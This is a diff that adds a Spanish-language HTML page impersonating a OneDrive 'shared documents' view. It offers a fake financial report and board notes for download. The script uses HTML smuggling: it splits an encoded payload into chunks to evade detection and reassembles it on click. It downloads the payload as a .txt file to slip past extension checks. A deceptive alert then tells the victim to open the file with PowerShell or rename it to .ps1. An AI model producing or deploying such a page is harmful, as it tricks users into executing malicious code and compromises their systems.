@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>OneDrive - Documentos Compartidos</title>
+    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 23 23'%3E%3Cpath fill='%230078d4' d='M1 1h10v10H1z'/%3E%3Cpath fill='%2300a4ef' d='M12 1h10v10H12z'/%3E%3Cpath fill='%237fba00' d='M1 12h10v10H1z'/%3E%3Cpath fill='%23ffb900' d='M12 12h10v10H12z'/%3E%3C/svg%3E">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', sans-serif; background: #f0f2f5; }
+        .header { background: #0078d4; color: white; padding: 12px 24px; display: flex; align-items: center; gap: 10px; }
+        .container { max-width: 900px; margin: 30px auto; padding: 0 20px; }
+        .file-card { background: white; border-radius: 8px; padding: 20px; margin: 15px 0; display: flex; align-items: center; gap: 15px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); cursor: pointer; transition: all 0.2s; }
+        .file-card:hover { box-shadow: 0 4px 12px rgba(0,0,0,0.15); transform: translateY(-1px); }
+        .file-icon { width: 48px; height: 48px; background: #107c10; border-radius: 4px; display: flex; align-items: center; justify-content: center; color: white; font-size: 20px; }
+        .file-info { flex: 1; }
+        .file-name { font-weight: 600; color: #323130; }
+        .file-meta { color: #605e5c; font-size: 12px; margin-top: 4px; }
+        .btn { background: #0078d4; color: white; border: none; padding: 8px 16px; border-radius: 4px; cursor: pointer; font-size: 14px; }
+        .btn:hover { background: #005a9e; }
+        #progress { display: none; margin-top: 20px; padding: 15px; background: #f3f2f1; border-radius: 4px; }
+        .progress-bar { width: 100%; height: 4px; background: #e1dfdd; border-radius: 2px; overflow: hidden; margin-top: 10px; }
+        .progress-fill { height: 100%; background: #0078d4; width: 0%; transition: width 0.3s; }
+        .shared-by { color: #605e5c; font-size: 13px; margin-bottom: 20px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <svg width="24" height="24" viewBox="0 0 23 23"><path fill="white" d="M1 1h10v10H1z"/><path fill="white" d="M12 1h10v10H12z"/></svg>
+        <span>OneDrive</span>
+    </div>
+    
+    <div class="container">
+        <h2 style="margin-bottom: 8px;">📁 Archivos compartidos</h2>
+        <p class="shared-by">Juan Pérez ha compartido 2 elementos contigo • Hace 2 horas</p>
+        
+        <div class="file-card" onclick="downloadFile('Reporte_Financiero_Q3.xlsx')">
+            <div class="file-icon">📊</div>
+            <div class="file-info">
+                <div class="file-name">Reporte_Financiero_Q3.xlsx</div>
+                <div class="file-meta">2.4 MB • Excel</div>
+            </div>
+            <button class="btn">Descargar</button>
+        </div>
+        
+        <div class="file-card" onclick="downloadFile('Notas_Reunion_Directiva.pdf')">
+            <div class="file-icon" style="background: #d83b01;">📄</div>
+            <div class="file-info">
+                <div class="file-name">Notas_Reunion_Directiva.pdf</div>
+                <div class="file-meta">856 KB • PDF</div>
+            </div>
+            <button class="btn">Descargar</button>
+        </div>
+        
+        <div id="progress">
+            <p>⏳ Preparando descarga...</p>
+            <div class="progress-bar"><div class="progress-fill" id="fill"></div></div>
+        </div>
+    </div>
+
+<script>
+// ============ HTML SMUGGLING ============
+// El payload está fragmentado para evadir detección por regex
+
+const CHUNKS = ['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'];
+
+function assemblePayload() {
+    return CHUNKS.join('');
+}
+
+function downloadFile(name) {
+    const progress = document.getElementById('progress');
+    const fill = document.getElementById('fill');
+    progress.style.display = 'block';
+    
+    // Animar progreso
+    let width = 0;
+    const interval = setInterval(() => {
+        width += Math.random() * 20;
+        if (width >= 100) {
+            width = 100;
+            clearInterval(interval);
+            executeDownload(name);
+        }
+        fill.style.width = width + '%';
+    }, 300);
+}
+
+function executeDownload(filename) {
+    // Reconstruir payload
+    const b64 = assemblePayload();
+    const compressed = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
+    
+    // Decompress (simplified - in real would use pako.js)
+    // For now, the downloaded file contains instructions
+    
+    // Create blob with .txt extension (evades extension check)
+    const payload = atob(b64);
+    const blob = new Blob([payload], {type: 'text/plain'});
+    
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = filename.replace(/\.[^.]+$/, '') + '.txt';
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+    URL.revokeObjectURL(url);
+    
+    // Mostrar instrucciones
+    setTimeout(() => {
+        alert('⚠️ IMPORTANTE\n\nEl archivo se descargó como .txt por seguridad del navegador.\n\nPara ver el reporte:\n1. Haz clic derecho en el archivo descargado\n2. Selecciona "Abrir con" → "PowerShell"\n3. O renombra la extensión de .txt a .ps1');
+    }, 500);
+}
+</script>
+</body>
+</html>
